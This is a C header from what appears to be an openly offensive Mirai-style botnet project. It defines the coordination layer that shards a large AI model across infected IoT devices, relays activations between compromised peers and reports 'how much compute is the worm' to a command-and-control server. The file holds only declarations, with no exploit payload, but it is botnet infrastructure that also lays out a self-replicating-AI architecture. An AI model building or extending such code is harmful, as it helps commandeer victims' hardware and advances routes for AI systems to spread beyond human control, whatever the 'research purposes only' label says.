/*
 * notnet - Modern Mirai-Style Botnet
 * shard.h - Distributed-inference replication substrate (#402)
 *
 * The faithful version of Anthropic's *self-replicating AI* threat
 * model: the worm doesn't just spread a binary, it turns the infected
 * fleet into a distributed inference engine. A model too large for one
 * weak IoT device is split into layer-shards (pipeline parallelism,
 * Petals-style); each bot holds a contiguous range of layers, fetches
 * its weight-shard through the SHA-256-pinned payload path, and
 * forwards hidden-state activations to the next shard peer over the
 * token-authenticated relay transport. The mesh carries the shard
 * assignment; arch_detect + a /proc/meminfo probe size the shard to
 * the box.
 *
 * This module is the COORDINATION + TRANSPORT layer. It does NOT ship
 * a neural-net runtime — the sim emulates the activation forward
 * (see tests/sim/shard_sim.py), and a real deployment would drop a
 * GGUF/ONNX shard runner as a remote plugin. The security-relevant
 * parts (shard assignment, weight integrity, activation transport,
 * capacity telemetry) are what we build and test here.
 *
 * Trust model:
 *  - Weight shards ride the existing payload download path and are
 *    verified against a per-shard SHA-256 pin (fail-closed, same as
 *    payload_sha256). A shard without a pin is refused.
 *  - Activations flow over relay sockets authenticated with the fleet
 *    relay_token; the mesh assignment is the same signed-command
 *    channel ARA/commands already use.
 *  - Nothing here widens the CVE probe->verify->drop discipline. Shard
 *    coordination happens only on already-infected hosts.
 *  - Off by default (shard_enabled=0): no shard fetch, no relay
 *    activation port, no heartbeat shard field.
 *
 * Research purposes only.
 */
#ifndef NOTNET_SHARD_H
#define NOTNET_SHARD_H

/* NOT including protocol.h here on purpose (it includes shard.h for
 * the notnet_bot_t.shard field — circular). The bot-taking
 * prototypes (shard_fetch, shard_bind_bot) are declared in protocol.h
 * after notnet_bot_t is complete. */
#include <stdint.h>
#include <stddef.h>

/* ── Bounds ──────────────────────────────────────────────────── */
#define SHARD_MODEL_NAME_MAX   64
#define SHARD_URL_MAX          256
#define SHARD_SHA_MAX          65      /* 64 hex + NUL */
#define SHARD_DIR_MAX          128
#define SHARD_PEER_MAX         32      /* == MESH_PEER_MAX */
#define SHARD_LAYER_MAX        256     /* max layers in a model */

/* ── Capacity probe ──────────────────────────────────────────── */
/* What a box can host. ram_mb is read from /proc/meminfo MemTotal
 * (Linux) and falls back to 0 (unknown) elsewhere; arch is the
 * arch_detect() label. tok_per_sec is an operator-configured estimate
 * (real throughput comes from the emulated runner; we do not fabricate
 * it). shard_layers is derived from ram_mb and the model's per-layer
 * size so the coordinator can assign a feasible range. */
typedef struct {
    uint32_t ram_mb;
    char     arch[16];
    uint32_t tok_per_sec;    /* x100 fixed-point; 0 = unknown */
    uint32_t shard_layers;   /* layers this box can hold */
} shard_capacity_t;

/* ── Shard assignment (from the coordinator / mesh) ──────────── */
/* A contiguous layer range [layer_start, layer_start+layer_count).
 * peers[] is the ordered pipeline: this bot forwards activations to
 * peers[next_index]; the last peer runs the LM head. */
typedef struct {
    char     model[SHARD_MODEL_NAME_MAX];
    uint16_t layer_start;
    uint16_t layer_count;
    char     peers[SHARD_PEER_MAX][256];  /* host:port, pipeline order */
    int      peer_count;
    int      my_index;                     /* position in the pipeline */
} shard_assignment_t;

/* ── Configuration (operator-set) ────────────────────────────── */
typedef struct {
    uint8_t  enabled;                 /* shard_enabled= */
    char     model[SHARD_MODEL_NAME_MAX];   /* shard_model= */
    uint16_t total_layers;            /* shard_layers= (model total) */
    char     shard_url[SHARD_URL_MAX];      /* shard_url= base for weight fetch */
    char     shard_sha[SHARD_SHA_MAX];      /* shard_sha256= pin (fail-closed) */
    char     shard_dir[SHARD_DIR_MAX];      /* shard_dir= where shards land */
    uint16_t relay_port;              /* activation relay port */
    uint32_t tok_per_sec;             /* operator estimate, x100 */
} shard_cfg_t;

/* ── Public API ──────────────────────────────────────────────── */

/* Probe this host's capacity for sharded inference: RAM from
 * /proc/meminfo, arch from arch_detect on a loopback probe (or the
 * passed hint), and a derived shard-layer count from the model's
 * per-layer footprint (shard_layer_mb, operator-configured). Never
 * blocks. */
void shard_probe_capacity(shard_capacity_t *cap, uint32_t layer_mb,
                          uint16_t total_layers);

/* Fetch + verify this host's weight shard for an assignment (see the
 * detailed contract in protocol.h, which declares it after
 * notnet_bot_t is complete). */
/* int shard_fetch(...) — declared in protocol.h */

/* Forward one activation frame to the next peer in the pipeline over
 * the relay transport. frame is opaque bytes of length len; the relay
 * carries it verbatim (the same splice relay.c already does). Returns
 * 0 on success, -1 on failure (no next peer, relay refused). The last
 * peer (my_index == peer_count-1) has nowhere to forward and returns
 * -1 by design — it runs the LM head locally. */
int  shard_forward(const shard_assignment_t *asg, const void *frame,
                   size_t len);

/* Render the heartbeat shard field: "model=..;layers=s-e;idx=i/n;
 * peers=k;ram=MB;arch=..;tok=x.xx". Empty when sharding disabled. */
void shard_status_render(const shard_cfg_t *cfg,
                         const shard_assignment_t *asg,
                         const shard_capacity_t *cap, char *buf, size_t len);

/* Assignment accessors (the coordinator pushes one via the shard
 * command / mesh; stored in module state). */
void shard_set_assignment(const shard_assignment_t *asg);
int  shard_get_assignment(shard_assignment_t *out);
int  shard_have_assignment(void);

/* Aggregate fleet throughput estimate (x100 tok/s) across known
 * pipeline peers — a coarse "how much compute is the worm" number for
 * the C2. Not a real benchmark; operator-fed like ARA's R0. */
void shard_update_fleet_tps(int peers, uint32_t tok_per_sec_x100);
int  shard_fleet_tps_x100(void);

#endif /* NOTNET_SHARD_H */
